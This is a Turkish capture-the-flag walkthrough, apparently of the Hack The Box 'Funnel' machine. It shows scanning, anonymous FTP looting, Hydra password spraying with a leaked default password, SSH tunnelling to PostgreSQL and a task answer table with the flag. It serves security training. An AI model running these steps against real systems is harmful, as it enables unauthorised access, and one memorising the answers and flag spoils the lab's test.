## 1. Keşif

Her zamanki gibi işe kapsamlı bir Nmap taramasıyla başlıyorum. Öncelikle tüm portları tarayıp servis/versiyon bilgisi ve OS tespiti almak istiyorum:

```bash
nmap -sS -A -p- -T5 10.129.184.109
```

<img width="670" height="547" alt="nmap2" src="https://github.com/user-attachments/assets/a1fa444d-c23c-46d1-b531-2c87ee72fb52" />


Ek olarak hızlı bir doğrulama taraması da attım:

```bash
nmap -vvv 10.129.184.109
```

<img width="782" height="327" alt="nmap1" src="https://github.com/user-attachments/assets/9501eb2b-87f0-4c90-911e-34a46ea71805" />

Sonuç net: hedefte sadece **2 adet TCP portu** açık — **21 (FTP)** ve **22 (SSH)**. Nmap ayrıca birkaç "filtered" port göstermiş olsa da (11617, 12006, 13232 vb.) bunlar gerçek açık portlar değil, muhtemelen bir firewall/IDS tarafından filtreleniyor. Gerçek anlamda açık ve kullanılabilir olan yalnızca 21 ve 22.

En dikkat çekici detay ise FTP taramasında çıkan şu satır:

```
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxr-xr-x    2 ftp      ftp          4096 Nov 28  2022 mail_backup
```

FTP'de **anonymous login** açık ve `mail_backup` adında bir dizin var. Buradan devam edelim.

---

## 2. FTP Üzerinden İlk Erişim

Anonim girişle FTP sunucusuna bağlanıyorum:

```bash
ftp 10.129.184.109
Name: anonymous
Password: (boş)
```

Bağlandıktan sonra dizin listesine bakıyorum:

```
ftp> ls
229 Entering Extended Passive Mode (|||31640|)
150 Here comes the directory listing.
drwxr-xr-x    2 ftp      ftp          4096 Nov 28  2022 mail_backup
226 Directory send OK.
```

`mail_backup` dizinine giriyorum:

```
ftp> cd mail_backup
250 Directory successfully changed.
ftp> ls
229 Entering Extended Passive Mode (|||61320|)
150 Here comes the directory listing.
-rw-r--r--    1 ftp      ftp         58899 Nov 28  2022 password_policy.pdf
-rw-r--r--    1 ftp      ftp           713 Nov 28  2022 welcome_28112022
226 Directory send OK.
```

İki dosya var: bir PDF (`password_policy.pdf`) ve bir düz metin dosyası (`welcome_28112022`). İkisini de indiriyorum:

```
ftp> get password_policy.pdf
ftp> get welcome_28112022
ftp> exit
```
<img width="907" height="642" alt="ftp" src="https://github.com/user-attachments/assets/656444e4-e733-4ab7-8a0b-4c3deebd1e08" />

---

## 3. Elde Edilen Dosyaların İncelenmesi

### 3.1. `welcome_28112022` dosyası

```bash
cat welcome_28112022
```

<img width="913" height="270" alt="welcomedosya" src="https://github.com/user-attachments/assets/0690f624-b96f-4506-88c0-b508d3d6dddb" />


Bu e-posta bize çok değerli bir bilgi veriyor: **5 adet kullanıcı adı**.

```
optimus
albert
andreas
christine
maria
```

Bu isimleri bir `users.txt` dosyasına kaydediyorum, ilerideki brute-force denemesinde kullanacağım.

### 3.2. `password_policy.pdf` dosyası

PDF dosyasını `cat` ile açmaya çalışırsanız binary içerik nedeniyle bozuk/okunmaz görünür. Bunun yerine dosyayı doğrudan bir PDF görüntüleyici ile (Kali'de `xdg-open` / `open .` ile dosya yöneticisinden çift tıklayarak) açtım.

PDF içinde şirketin şifre politikası anlatılıyor, ve en kritik kısım şu:
Yeni işe başlayan her kullanıcıya varsayılan olarak **`funnel123#!#`** şifresi atanıyor ve değiştirilmesi isteniyor. Buradan yola çıkarak henüz bu şifreyi değiştirmemiş bir kullanıcı olabileceğini düşünüyorum.

<img width="605" height="545" alt="passworddosya" src="https://github.com/user-attachments/assets/0f07eba7-5273-479c-b78a-5bd4228c62f5" />

---

## 4. Kimlik Doğrulama Bilgilerinin Doğrulanması — SSH Brute Force

Elimde 5 kullanıcı adı ve 1 aday şifre var. Klasik bir password-spraying senaryosu. Hydra ile SSH servisine karşı deniyorum:

```bash
hydra -L users.txt -p 'funnel123#!#' 10.129.184.109 ssh
```

Sonuçta **christine** kullanıcısının hâlâ varsayılan şifresini kullandığı ortaya çıkıyor. Diğer kullanıcılar muhtemelen politikayı takip edip şifrelerini değiştirmiş.

<img width="920" height="270" alt="hydrasonuç" src="https://github.com/user-attachments/assets/44fb38a0-1f14-481d-ac42-cf07eed914e3" />


SSH ile bağlanıyorum:

```bash
ssh christine@10.129.184.109
# Password: funnel123#!#
```

Başarılı bir şekilde `christine` kullanıcısı olarak sisteme giriş yapıyorum.

<img width="670" height="160" alt="sshbağlantı" src="https://github.com/user-attachments/assets/987e1178-1375-492e-b5d9-b0679697b6df" />

---

## 5. Yerel Servislerin Keşfi — PostgreSQL

Sisteme giriş yaptıktan sonra dinleyen (listening) servisleri kontrol ediyorum:

```bash
christine@funnel:~$ ss -tln
```

```
State        Recv-Q       Send-Q             Local Address:Port              Peer Address:Port      Process
LISTEN       0            4096                   127.0.0.1:33483                  0.0.0.0:*
LISTEN       0            4096               127.0.0.53%lo:53                     0.0.0.0:*
LISTEN       0            128                      0.0.0.0:22                     0.0.0.0:*
LISTEN       0            4096                   127.0.0.1:5432                   0.0.0.0:*
LISTEN       0            32                             *:21                           *:*
LISTEN       0            128                         [::]:22                        [::]:*
```

`ss -tl` çıktısında servis isimleri de görünüyor:

```
127.0.0.1:postgresql
```

<img width="874" height="252" alt="listelemeport" src="https://github.com/user-attachments/assets/73066490-edf1-412f-9f22-2b562414b684" />


Görüldüğü üzere **5432 portunda PostgreSQL servisi** çalışıyor, fakat sadece `127.0.0.1` (localhost) üzerinde dinliyor — yani dışarıdan doğrudan erişilemiyor. Bu servise ulaşabilmek için bir SSH tüneli kurmam gerekiyor.

---

## 6. SSH ile Local Port Forwarding

Servis sadece hedef makinenin localhost'unda dinlediği için, doğrudan bana (saldırgan makineye) bağlantı gelmiyor — ben bağlantıyı hedefe doğru başlatmam gerekiyor. Bu durumda kullanılması gereken doğru yöntem **local port forwarding (yerel port yönlendirme)**'dir; **remote port forwarding değil**, çünkü tünelin amacı benim yerel makinemden hedefin localhost'undaki bir servise erişim sağlamak (`-L` seçeneği).

```bash
ssh -L 1234:localhost:5432 christine@10.129.184.109
```

<img width="538" height="85" alt="portforwarding" src="https://github.com/user-attachments/assets/d820d7c7-696f-420f-997d-13985ac98325" />


Bu komutla kendi makinemdeki `1234` portuna gelen trafiği, SSH tüneli üzerinden hedef makinenin `localhost:5432` adresine yönlendirmiş oluyorum.

Tünel ayaktayken artık kendi makinemden PostgreSQL'e bağlanabilirim:

```bash
psql -U christine -h 127.0.0.1 -p 1234
Password for user christine: funnel123#!#
```

Bağlantı başarılı.

---

## 7. PostgreSQL Üzerinde Veri Keşfi ve Flag

Öncelikle mevcut veritabanlarını listeliyorum:

```sql
\list
```

```
   Name    |   Owner   | Encoding
-----------+-----------+----------
 christine | christine | UTF8
 postgres  | christine | UTF8
 secrets   | christine | UTF8
 template0 | christine | UTF8
 template1 | christine | UTF8
```

İsminden de anlaşılacağı üzere `secrets` veritabanı ilgimi çekiyor. Bağlanıyorum:

```sql
\connect secrets
```

```
You are now connected to database "secrets" as user "christine".
```

Tablo listesine bakıyorum:

```sql
\dt
```

```
 Schema | Name | Type  |   Owner
--------+------+-------+-----------
 public | flag | table | christine
```

`flag` adında bir tablo var. İçeriğini sorguluyorum:

```sql
SELECT * FROM flag;
```

```
              value
----------------------------------
 cf277664b1771217d7006acdea006db1
```

Flag başarıyla elde edildi. 🎉

<img width="556" height="431" alt="flag" src="https://github.com/user-attachments/assets/0a8606a6-ba4a-417b-adcc-0396c723373e" />

---


## 9. Görev Cevapları

| Görev | Soru | Cevap |
|---|---|---|
| **Görev 1** | Kaç adet TCP portu açık? | **2** (21/FTP, 22/SSH) |
| **Görev 2** | FTP sunucusunda bulunan dizinin adı nedir? | **mail_backup** |
| **Görev 3** | "Funnel" ekibine yeni katılan her üyenin en kısa sürede değiştirmesi gereken varsayılan hesap şifresi nedir? | **funnel123#!#** |
| **Görev 4** | Hangi kullanıcı varsayılan şifresini henüz değiştirmedi? | **christine** |
| **Görev 5** | TCP 5432 portunda çalışan ve yalnızca localhost'u dinleyen servis hangisidir? | **PostgreSQL** |
| **Görev 6** | Yerel makinenizden daha önce bahsedilen servise erişemediğiniz için tünel kurmanız gerekiyor — hangi tünelleme türü doğru? | **Local port forwarding (yerel port yönlendirme)** — `ssh -L 1234:localhost:5432 christine@10.129.184.109` |
| **Görev 7** | Bayrağın saklandığı veritabanının adı nedir? | **secrets** |
| **Task 8** | Could you use a dynamic tunnel instead of local port forwarding? | **Hayır (No)** — Dinamik tünel (`ssh -D`, SOCKS proxy) trafiği uygulama bazında yönlendirmez, genel bir SOCKS proxy oluşturur; belirli bir yerel porttan belirli bir hedef porta doğrudan statik yönlendirme yapmaz. Bu senaryoda tek, sabit bir servise (`localhost:5432`) erişim gerektiği için doğru ve pratik çözüm local port forwarding'dir. |
| **Flag** | Submit the flag located in the database. | **cf277664b1771217d7006acdea006db1** |
